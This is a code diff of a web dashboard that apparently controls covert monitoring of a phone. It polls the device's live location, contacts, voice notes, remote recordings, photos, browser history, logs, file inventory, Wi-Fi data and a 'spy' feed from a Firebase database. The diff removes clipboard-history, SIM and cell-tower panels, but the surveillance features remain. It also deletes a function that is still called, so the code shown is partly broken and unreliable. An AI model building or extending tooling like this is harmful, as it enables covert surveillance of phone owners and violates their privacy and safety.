@@ -628,9 +628,7 @@ canvas.chart-canvas{width:100%!important;height:200px!important;border-radius:6p
     <div><span class="label" style="font-size:12px">Active App</span><br><span id="activeAppVal" style="font-weight:500">--</span></div>
     <div><span class="label" style="font-size:12px">Last Screen On</span><br><span id="lastScreenOnVal" style="font-weight:500">--</span></div>
     <div><span class="label" style="font-size:12px">Steps Today</span><br><span id="liveStepsVal" style="font-weight:500">--</span></div>
-    <div><span class="label" style="font-size:12px">Carrier</span><br><span id="liveCarrierVal" style="font-weight:500">--</span></div>
     <div><span class="label" style="font-size:12px">Network</span><br><span id="liveNetworkVal" style="font-weight:500">--</span></div>
-    <div><span class="label" style="font-size:12px">SIM</span><br><span id="liveSimVal" style="font-weight:500">--</span></div>
   </div>
 </div>
 <!-- Activity — Latest + last 5 -->
@@ -649,38 +647,6 @@ canvas.chart-canvas{width:100%!important;height:200px!important;border-radius:6p
 <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px"><span style="font-size:13px;font-weight:600;color:var(--muted)">🏃 Activity</span><span class="chip" style="font-size:11px;cursor:pointer" onclick="pollActivity()">↻ Refresh</span></div>
 <div id="liveActivityLatest" style="font-size:15px;font-weight:500">— <span style="font-size:12px;color:var(--muted)">No activity yet</span></div>
 <div id="liveActivityHistory" style="margin-top:8px;display:flex;flex-direction:column;gap:4px"></div>
-</div>
-<!-- SIM Slots — inside Live -->
-<div style="display:flex;align-items:center;gap:12px;margin-top:10px;padding:10px 12px;background:var(--card);border:1px solid var(--border);border-radius:8px" id="syncToggleWrap_simSlots">
-<label style="display:flex;align-items:center;gap:8px;cursor:pointer;user-select:none">
-<div style="position:relative;width:44px;height:24px">
-<input type="checkbox" id="syncPauseToggle_simSlots" onchange="toggleSyncPause('simSlots', this.checked)" style="opacity:0;width:0;height:0">
-<span id="syncToggleSlider_simSlots" style="position:absolute;inset:0;background:var(--success);border-radius:12px;transition:.2s"></span>
-<span id="syncToggleKnob_simSlots" style="position:absolute;left:2px;top:2px;width:20px;height:20px;background:#fff;border-radius:50%;transition:.2s;box-shadow:0 1px 3px rgba(0,0,0,.3)"></span>
-</div>
-<span id="syncToggleLabel_simSlots" style="font-size:13px;font-weight:600;color:var(--success)">SIM Sync: Collecting</span>
-</label>
-<span id="syncToggleStatus_simSlots" style="font-size:12px;color:var(--muted);margin-left:auto">—</span>
-</div>
-<div class="card" style="border-left-color:var(--success);padding:10px 12px;margin-top:8px">
-<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px"><span style="font-size:13px;font-weight:600;color:var(--muted)">📱 SIM Slots</span><span class="chip" style="font-size:11px;cursor:pointer" onclick="pollSimSlots()">↻ Refresh</span></div>
-<div id="liveSimSlots" style="font-size:13px;color:var(--muted)">—</div>
-</div>
-<!-- Cell Towers — full list inside Live -->
-<div style="display:flex;align-items:center;gap:12px;margin-top:10px;padding:10px 12px;background:var(--card);border:1px solid var(--border);border-radius:8px" id="syncToggleWrap_cellInfo">
-<label style="display:flex;align-items:center;gap:8px;cursor:pointer;user-select:none">
-<div style="position:relative;width:44px;height:24px">
-<input type="checkbox" id="syncPauseToggle_cellInfo" onchange="toggleSyncPause('cellInfo', this.checked)" style="opacity:0;width:0;height:0">
-<span id="syncToggleSlider_cellInfo" style="position:absolute;inset:0;background:var(--success);border-radius:12px;transition:.2s"></span>
-<span id="syncToggleKnob_cellInfo" style="position:absolute;left:2px;top:2px;width:20px;height:20px;background:#fff;border-radius:50%;transition:.2s;box-shadow:0 1px 3px rgba(0,0,0,.3)"></span>
-</div>
-<span id="syncToggleLabel_cellInfo" style="font-size:13px;font-weight:600;color:var(--success)">Cell Towers Sync: Collecting</span>
-</label>
-<span id="syncToggleStatus_cellInfo" style="font-size:12px;color:var(--muted);margin-left:auto">—</span>
-</div>
-<div class="card" style="border-left-color:var(--danger);padding:10px 12px;margin-top:8px">
-<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px"><span style="font-size:13px;font-weight:600;color:var(--muted)">📡 Cell Towers</span><span class="chip" style="font-size:11px;cursor:pointer" onclick="pollCellInfo()">↻ Refresh</span></div>
-<div id="liveCellInfo" style="font-size:12px;color:var(--muted)">—</div>
 </div>
 <div id="statusWidget" style="margin-top:8px;display:flex;gap:6px;flex-wrap:wrap;font-size:10px">
   <span class="chip" style="background:var(--bg);border-color:var(--border);color:var(--muted)" id="swBattery">&#x1F50B; --</span>
@@ -718,31 +684,6 @@ canvas.chart-canvas{width:100%!important;height:200px!important;border-radius:6p
 <span id="syncToggleLabel_mirroring" style="font-size:13px;font-weight:600;color:var(--success)">Mirroring Sync: Collecting</span>
 </label>
 <span id="syncToggleStatus_mirroring" style="font-size:12px;color:var(--muted);margin-left:auto">—</span>
-</div>
-<div style="display:flex;align-items:center;gap:12px;margin-top:10px;padding:10px 12px;background:var(--card);border:1px solid var(--border);border-radius:8px" id="syncToggleWrap_clipboard">
-<label style="display:flex;align-items:center;gap:8px;cursor:pointer;user-select:none">
-<div style="position:relative;width:44px;height:24px">
-<input type="checkbox" id="syncPauseToggle_clipboard" onchange="toggleSyncPause('clipboard', this.checked)" style="opacity:0;width:0;height:0">
-<span id="syncToggleSlider_clipboard" style="position:absolute;inset:0;background:var(--success);border-radius:12px;transition:.2s"></span>
-<span id="syncToggleKnob_clipboard" style="position:absolute;left:2px;top:2px;width:20px;height:20px;background:#fff;border-radius:50%;transition:.2s;box-shadow:0 1px 3px rgba(0,0,0,.3)"></span>
-</div>
-<span id="syncToggleLabel_clipboard" style="font-size:13px;font-weight:600;color:var(--success)">Clipboard Sync: Collecting</span>
-</label>
-<span id="syncToggleStatus_clipboard" style="font-size:12px;color:var(--muted);margin-left:auto">—</span>
-</div>
-<!-- Clipboard card -->
-<div class="card" style="border-left-color:var(--accent);padding:12px;margin-top:8px;margin-bottom:12px">
-  <div style="display:flex;align-items:center;gap:6px;margin-bottom:8px">
-    <span style="font-size:18px;flex-shrink:0">&#x1F4CB;</span>
-    <span style="font-weight:500;font-size:13px;color:var(--muted)">Clipboard</span>
-  </div>
-  <div id="clipboardCardText" style="font-family:monospace;font-size:13px;white-space:pre-wrap;word-break:break-all;background:var(--bg);padding:8px 12px;border-radius:6px;margin-top:6px;border:1px solid var(--border);color:var(--muted);min-height:36px">
-    No clipboard data yet
-  </div>
-  <div style="display:flex;gap:6px;flex-wrap:wrap;margin-top:8px">
-    <button class="chip" style="background:var(--accent);color:#000;border-color:var(--accent);font-size:12px;padding:6px 12px" onclick="navigator.clipboard&&navigator.clipboard.writeText('').then(()=>showAlert('Copied','ok'))">&#x1F4CB; Copy</button>
-    <span class="chip" style="font-size:11px;color:var(--muted)" id="clipboardCardTS">--</span>
-  </div>
 </div>
 <div class="card" style="border-left-color:var(--accent);padding:12px;margin-top:8px">
   <div style="font-size:15px;font-weight:500;margin-bottom:8px">&#x1F4E1; Remote Sync Trigger</div>
@@ -2084,7 +2025,7 @@ let playbackLoop = false;
 // --- Poll Timers ---
 let pollTimers = [];
 // Sustainable baseline: ~34K reads/day parked, ~42K away (loc 10s) — stays under 50K quota. Before: 146K/day.
-const BASE_INTERVALS = { loc: 10000, hist: 600000, meta: 60000, apps: 300000, voice: 300000, fcm: 60000, contacts: 3600000, perms: 900000, logcat: 300000, remote: 60000, photos: 600000, videos: 300000, health: 3600000, mirror: 120000, spy: 60000, clipboard: 60000, files: 840000, appVer: 60000, browser: 300000, activity: 120000, ai: 300000, timeline: 300000, savedWifi: 3600000, cellInfo: 300000, simSlots: 3600000, queue: 60000, wifi: 300000, nearby: 300000, logcatToggle: 60000, heat: 120000, updatePause: 60000, appSnapshots: 60000, syncToggles: 60000, tuning: 60000 };
+const BASE_INTERVALS = { loc: 10000, hist: 600000, meta: 60000, apps: 300000, voice: 300000, fcm: 60000, contacts: 3600000, perms: 900000, logcat: 300000, remote: 60000, photos: 600000, videos: 300000, health: 3600000, mirror: 120000, spy: 60000, files: 840000, appVer: 60000, browser: 300000, activity: 120000, ai: 300000, timeline: 300000, savedWifi: 3600000, queue: 60000, wifi: 300000, nearby: 300000, logcatToggle: 60000, heat: 120000, updatePause: 60000, appSnapshots: 60000, syncToggles: 60000, tuning: 60000 };
 let intervals = { ...BASE_INTERVALS };
 
 // --- Init Map ---
@@ -2116,11 +2057,11 @@ function trackRead(count = 1) {
   if (rbEl) rbEl.textContent = `\u{1F4CA} ${readBudget.count.toLocaleString()}/50K`;
   // Tiered throttle to stay under 50K quota. Base parked ~34K/day; gentle at 30K, reduced at 40K, critical at 45K.
   if (readBudget.count > 45000) {
-    intervals = { ...BASE_INTERVALS, loc: 30000, meta: 180000, mirror: 300000, spy: 300000, tuning: 300000, syncToggles: 180000, clipboard: 300000, activity: 600000, appVer: 300000, queue: 180000, heat: 600000, updatePause: 180000, appSnapshots: 300000, remote: 300000, wifi: 600000, nearby: 600000, logcat: 600000, logcatToggle: 300000, videos: 600000, browser: 600000, ai: 600000, timeline: 600000, cellInfo: 600000 };
+    intervals = { ...BASE_INTERVALS, loc: 30000, meta: 180000, mirror: 300000, spy: 300000, tuning: 300000, syncToggles: 180000, activity: 600000, appVer: 300000, queue: 180000, heat: 600000, updatePause: 180000, appSnapshots: 300000, remote: 300000, wifi: 600000, nearby: 600000, logcat: 600000, logcatToggle: 300000, videos: 600000, browser: 600000, ai: 600000, timeline: 600000 };
     if (readBudget.count % 60 === 0) showAlert('Firebase quota critical (' + readBudget.count.toLocaleString() + '/50K) — minimal polling until midnight', 'warn');
     if (rbEl) rbEl.style.color = 'var(--danger)';
   } else if (readBudget.count > 40000) {
-    intervals = { ...BASE_INTERVALS, meta: 120000, mirror: 300000, spy: 120000, tuning: 120000, syncToggles: 120000, clipboard: 120000, activity: 300000, appVer: 120000, queue: 120000, heat: 300000, updatePause: 120000, appSnapshots: 120000, remote: 120000, wifi: 600000, nearby: 600000, logcat: 600000, videos: 600000 };
+    intervals = { ...BASE_INTERVALS, meta: 120000, mirror: 300000, spy: 120000, tuning: 120000, syncToggles: 120000, activity: 300000, appVer: 120000, queue: 120000, heat: 300000, updatePause: 120000, appSnapshots: 120000, remote: 120000, wifi: 600000, nearby: 600000, logcat: 600000, videos: 600000 };
     if (readBudget.count % 80 === 0) showAlert('Approaching Firebase read limit — reduced poll rate', 'warn');
     if (rbEl) rbEl.style.color = 'var(--warning)';
   } else if (readBudget.count > 30000) {
@@ -3509,12 +3450,7 @@ function startPolling() {
   schedulePoll('spy', intervals.spy, pollSpy);
   schedulePoll('appVer', intervals.appVer, pollAppVer);
   schedulePoll('photos', intervals.photos, pollPhotos);
-  schedulePoll('videos', intervals.videos, pollVideos);
-  schedulePoll('clipboard', intervals.clipboard, pollClipboard);
-  schedulePoll('activity', intervals.activity, pollActivity);
-  schedulePoll('simSlots', intervals.simSlots, pollSimSlots);
-  schedulePoll('cellInfo', intervals.cellInfo, pollCellInfo);
-  schedulePoll('savedWifi', intervals.savedWifi, pollSavedWifi);
+  schedulePoll('videos', intervals.videos, pollVideos);  schedulePoll('activity', intervals.activity, pollActivity);  schedulePoll('savedWifi', intervals.savedWifi, pollSavedWifi);
   schedulePoll('syncToggles', intervals.syncToggles, pollSyncToggles);
   schedulePoll('tuning', intervals.tuning, pollTuning);
   schedulePoll('heat', intervals.heat, pollHeat);
@@ -3531,7 +3467,7 @@ function schedulePoll(name, interval, fn) {
 }
 
 async function pollAll() {
-  const fns = [pollLocation(), pollMeta(), pollAppSnapshots(), pollHistory(), pollVoiceNotes(), pollRemoteRecordings(), pollContacts(), pollFcmToken(), pollQueueSize(), pollPermissions(), pollWifiScans(), pollNearbyScans(), pollLogcat(), pollHealth(), pollVideos(), pollPhotos(), pollMirroring(), pollSpy(), pollAppVer(), pollClipboard(), pollFileInventory(), pollActivity(), pollSimSlots(), pollCellInfo(), pollSavedWifi(), pollSyncToggles(), pollTuning(), pollUpdatePause()];
+  const fns = [pollLocation(), pollMeta(), pollAppSnapshots(), pollHistory(), pollVoiceNotes(), pollRemoteRecordings(), pollContacts(), pollFcmToken(), pollQueueSize(), pollPermissions(), pollWifiScans(), pollNearbyScans(), pollLogcat(), pollHealth(), pollVideos(), pollPhotos(), pollMirroring(), pollSpy(), pollAppVer(), pollFileInventory(), pollActivity(), pollSavedWifi(), pollSyncToggles(), pollTuning(), pollUpdatePause()];
   for (const fn of fns) { try { await fn; } catch {} }
 }
 
@@ -3673,9 +3609,7 @@ async function pollMeta() {
   document.getElementById('wifiVal').textContent = m.wifiSsid || '--';
   document.getElementById('devVal').textContent = m.deviceModel || '--';
   document.getElementById('liveStepsVal').textContent = m.stepsToday ? m.stepsToday.toLocaleString() : '--';
-  document.getElementById('liveCarrierVal').textContent = m.networkOperatorName || m.networkOperator || '--';
   document.getElementById('liveNetworkVal').textContent = m.networkTypeDetail || '--';
-  document.getElementById('liveSimVal').textContent = m.simCountryIso ? m.simCountryIso.toUpperCase() : '--';
   // Status widget
   const swBat = document.getElementById('swBattery');
   if (swBat) {
@@ -3739,13 +3673,6 @@ async function pollMeta() {
       const mins = Math.round(m.totalScreenMs / 60000);
       const h = Math.floor(mins/60), mm = mins % 60;
       swSc.textContent = '\u{1F4F1} ' + (h ? h + 'h ' + mm + 'm' : mm + 'm screen');
-    }
-    const swClip = document.getElementById('swClipboard');
-    if (swClip && m.clipboardLastText) {
-      const txt = m.clipboardLastText.length > 20 ? m.clipboardLastText.substring(0, 20) + '...' : m.clipboardLastText;
-      swClip.textContent = '\u{1F4CB} ' + (txt.length > 0 ? txt : '--');
-      swClip.style.borderColor = 'var(--accent)';
-      swClip.style.color = 'var(--muted)';
     }
   } catch {}
   if (m.deviceModel && devices[selectedDevice]) {
@@ -3837,119 +3764,6 @@ async function pollActivity(){
     if(history.length===0) histEl.innerHTML='<div style="font-size:12px;color:var(--muted)">No history yet</div>';
   }catch(e){ console.error('pollActivity',e); }
 }
-async function pollSimSlots(){
-  if(!selectedDevice) return;
-  try{
-    const m=await fetchRTDB(`devices/${selectedDevice}/metrics/latest`);
-    const el=document.getElementById('liveSimSlots');
-    if(!el) return;
-    let sims=[];
-    if(m && m.simSlots && Array.isArray(m.simSlots)) sims=m.simSlots;
-    else if(m && m.simSlots && typeof m.simSlots==='object') sims=Object.values(m.simSlots);
-    // also try direct node
-    if(!sims.length){
-      const direct=await fetchRTDB(`devices/${selectedDevice}/simSlots`);
-      if(direct) sims=Array.isArray(direct)?direct:Object.values(direct);
-    }
-    if(!sims.length){ el.innerHTML='<span style="color:var(--muted)">— No SIM data yet</span>'; return; }
-    el.innerHTML=sims.map(s=>`<div style="padding:4px 6px;background:var(--bg);border:1px solid var(--border);border-radius:6px;margin-bottom:4px">Slot ${s.slot!=null?s.slot:'?'}: <b>${escHtml(s.carrier||s.displayName||'Unknown')}</b> ${s.number?' · '+escHtml(s.number):''} <span style="color:var(--muted)">mcc:${escHtml(s.mcc||'-')} mnc:${escHtml(s.mnc||'-')} ${s.countryIso||''}</span></div>`).join('');
-  }catch(e){ console.error('pollSimSlots',e); }
-}
-async function pollCellInfo(){
-  if(!selectedDevice) return;
-  try{
-    const m=await fetchRTDB(`devices/${selectedDevice}/metrics/latest`);
-    const el=document.getElementById('liveCellInfo');
-    if(!el) return;
-    let cells=[];
-    if(m && m.cellInfo && Array.isArray(m.cellInfo)) cells=m.cellInfo;
-    else if(m && m.cellInfo && typeof m.cellInfo==='object') cells=Object.values(m.cellInfo);
-    else {
-      const direct=await fetchRTDB(`devices/${selectedDevice}/cellInfo`);
-      if(direct) cells=Array.isArray(direct)?direct:Object.values(direct);
-    }
-    if(!Array.isArray(cells) || !cells.length){ el.innerHTML='<span style="color:var(--muted)">— No cell towers yet</span>'; return; }
-    el.innerHTML=cells.map(c=>{
-      const type=(c.type||'').toUpperCase();
-      const ids=['ci','cid','lac','tac','pci','mcc','mnc','basestation','network'].map(k=> c[k]!=null && c[k]!==-1 ? `${k}:${c[k]}`:'').filter(Boolean).join(' ');
-      const dbm=c.dbm!=null? c.dbm+'dBm':'';
-      const lvl=c.level!=null? ' lvl:'+c.level:'';
-      const roaming=c.isRoaming? ' 🌍 roaming':'';
-      return `<div style="padding:5px 6px;background:var(--bg);border:1px solid var(--border);border-radius:6px;margin-bottom:4px;font-size:12px"><b>${escHtml(type||'CELL')}</b> ${escHtml(ids)} <span style="color:var(--muted)">${dbm}${lvl}${roaming} · ${escHtml(c.phoneType||'')}</span></div>`;
-    }).join('');
-  }catch(e){ console.error('pollCellInfo',e); }
-}
-async function pollSavedWifi(){
-  if(!selectedDevice) return;
-  try{
-    const el=document.getElementById('savedWifiList');
-    if(!el) return;
-    const q=(document.getElementById('savedWifiSearch')?.value||'').toLowerCase();
-    let data=await fetchRTDB(`devices/${selectedDevice}/metrics/latest`);
-    let arr=[];
-    if(data && data.savedNetworks && Array.isArray(data.savedNetworks)) arr=data.savedNetworks;
-    else if(data && data.savedNetworks && typeof data.savedNetworks==='object') arr=Object.values(data.savedNetworks);
-    else if(data && data.savedWifi && Array.isArray(data.savedWifi)) arr=data.savedWifi;
-    if(!arr.length){
-      const direct=await fetchRTDB(`devices/${selectedDevice}/savedWifi`);
-      if(direct) arr=Array.isArray(direct)?direct:Object.values(direct);
-    }
-    if(!arr.length){
-      const scan=await fetchRTDB(`devices/${selectedDevice}/wifi_scan`);
-      const k=scan?Object.keys(scan).find(x=>scan[x] && scan[x].savedNetworks):null;
-      if(k && scan[k].savedNetworks) arr=scan[k].savedNetworks;
-    }
-    // also try wifi_scan latest
-    if(!arr.length){
-      try{
-        const m2=await fetchRTDB(`devices/${selectedDevice}/wifi_scan`);
-        if(m2){
-          for(const key of Object.keys(m2)){
-            const v=m2[key];
-            if(v && v.savedNetworks && Array.isArray(v.savedNetworks) && v.savedNetworks.length){ arr=v.savedNetworks; break; }
-          }
-        }
-      }catch{}
-    }
-    let filtered=arr;
-    if(q) filtered=arr.filter(x=> (x.ssid||'').toLowerCase().includes(q));
-    if(!filtered.length){ el.innerHTML='<div class="label">'+(arr.length?'No match':'No saved networks yet')+'</div>'; return; }
-    el.innerHTML=filtered.map(x=>`<div class="card" style="padding:6px 10px;margin-bottom:4px"><b>${escHtml(x.ssid||'(hidden)')}</b> <span style="color:var(--muted);font-size:12px">${escHtml(x.capabilities||'')}</span></div>`).join('');
-  }catch(e){ console.error('pollSavedWifi',e); }
-}
-document.getElementById('savedWifiSearch')?.addEventListener('input', pollSavedWifi);
-
-// --- Screen mirroring / Link to Windows / USB-debug live status ---
-let mirrorPrevActive = false;
-let mirrorConfirmCount = 0;
-let usbPrevOn = false;
-
-function isMirrorType(t) { return t.includes('mirror') || t.includes('usb_debug') || t.includes('adb_wifi'); }
-function isSecurityType(t) { return t.includes('installed') || t.includes('detected') || t.includes('granted') || t.includes('reinstalled'); }
-
-function applyUsbChip(usbOn, wifiOn, usbSinceMs) {
-  const chip = document.getElementById('swUsbDebug');
-  if (!chip) return;
-  const on = !!usbOn;
-  const since = usbSinceMs ? pkt(parseInt(usbSinceMs, 10)) : '';
-  let label = '\u{1F50C} USB Debug off';
-  let color = 'var(--success)';
-  let border = 'var(--success)';
-  if (on) {
-    label = '\u{1F50C} \u26A0 USB DEBUG ON' + (wifiOn ? ' + WIFI-ADB' : '') + (since ? ' \u00B7 since ' + since : '');
-    color = 'var(--danger)';
-    border = 'var(--danger)';
-  }
-  if (on && !usbPrevOn) {
-    const devLabel = devices[selectedDevice] && devices[selectedDevice].label ? devices[selectedDevice].label : selectedDevice;
-    showAlert('\u26A0 USB debugging is ENABLED on ' + devLabel + ' (phone can be mirrored via ADB)', 'error');
-  }
-  usbPrevOn = on;
-  chip.textContent = label;
-  chip.style.borderColor = border;
-  chip.style.color = color;
-}
-
 async function pollMirroring() {
   if (!selectedDevice) return;
   const chip = document.getElementById('swMirror');
@@ -9447,7 +9261,6 @@ function renderCleanupActions(categories){
   renderCleanupActionsV2(categories);
 }
 
-
 async function execCleanup(action, path) {
   if (!selectedDevice) { showAlert('No device selected', 'error'); return; }
   const base = `devices/${selectedDevice}`;
@@ -10073,7 +9886,6 @@ function renderPermDeniedRanking() {
   return h;
 }
 
-
 function riskColor(level){
   const l = (level||'').toLowerCase();
   if(l==='critical') return 'var(--danger)';
@@ -10386,7 +10198,6 @@ async function pollPermissions() {
 
 document.getElementById('permSearch')?.addEventListener('input', renderPermissions);
 
-
 // --- WiFi ---
 let wifiCache = [];
 
@@ -10644,7 +10455,7 @@ async function pollSyncToggles(){
       // Even when per-phone has partial keys, do NOT merge global — missing key means collecting (default true), not global value
     }
     const masterPaused = data['all']===false || data['all']==='false' || data['all']===0;
-    const targets = ['location','wifi','recents','photos','videos','calls','contacts','voice','files','perms','health','all','browser','activity','ai','timeline','savedWifi','cellInfo','simSlots','apps','logcat','nearby','clipboard','system','mirroring'];
+    const targets = ['location','wifi','recents','photos','videos','calls','contacts','voice','files','perms','health','all','browser','activity','ai','timeline','savedWifi','apps','logcat','nearby','system','mirroring'];
     for(const tgt of targets){
       let val = data[tgt];
       let paused = false;
@@ -11098,7 +10909,6 @@ async function deleteSingleFile(encName, encFolder){
   }catch(e){ showAlert('Delete failed: '+e.message,'error'); if(statusEl){ statusEl.textContent='Error: '+e.message; statusEl.style.color='var(--danger)'; } }
 }
 
-
 document.getElementById('logcatFilter')?.addEventListener('change', renderLogcat);
 document.getElementById('logcatSearch')?.addEventListener('input', renderLogcat);
 
@@ -11428,39 +11238,6 @@ async function pollHealth() {
   // Graceful empty state when nothing is synced
   const healthHint = document.getElementById('healthEmptyHint');
   if (healthHint) healthHint.style.display = hasAnyHealthData ? 'none' : 'block';
-}
-
-async function pollClipboard() {
-  if (!selectedDevice) return;
-  try {
-    const data = await fetchRTDB(`devices/${selectedDevice}/clipboardHistory`, 'orderBy=%22ts_ms%22&limitToLast=50');
-    const cardText = document.getElementById('clipboardCardText');
-    const cardTS = document.getElementById('clipboardCardTS');
-    if (!cardText) return;
-    if (!data || typeof data !== 'object' || data === null) { 
-      cardText.innerHTML = 'No clipboard data yet';
-      if (cardTS) cardTS.textContent = '--';
-      return; 
-    }
-    const entries = Object.values(data).filter(v => v && v.text).sort((a,b)=> (parseInt(b.ts_ms||'0') - parseInt(a.ts_ms||'0')));
-    if (!entries.length) { 
-      cardText.innerHTML = 'No clipboard data yet';
-      if (cardTS) cardTS.textContent = '--';
-      return; 
-    }
-    // Update card with latest clipboard text
-    const latest = entries[0];
-    const t = latest.text || '';
-    const esc = t.replace(/&/g,'&').replace(/</g,'<').replace(/>/g,'>');
-    const truncated = t.length > 50 ? t.substring(0, 50) + '...' : t;
-    cardText.innerHTML = `<div style="font-family:monospace;font-size:13px;white-space:pre-wrap;word-break:break-all;background:var(--bg);padding:8px 12px;border-radius:6px;margin-top:6px;border:1px solid var(--border);color:var(--text)">${esc}</div>`;
-    // Update timestamp
-    const ts = parseInt(latest.ts_ms || '0');
-    if (cardTS) cardTS.textContent = pkt(ts) + ' ago';
-    // Update Live tab chip for visual status (optional, kept for compatibility)
-    const swClip = document.getElementById('swClipboard');
-    if (swClip) swClip.textContent = '\u{1F4CB} ' + (t.length > 0 ? (t.length > 50 ? t.substring(0, 5) + '...' : t) : '--');
-  } catch(e) { console.error('pollClipboard', e); }
 }
 
 async function pollFileInventory() {
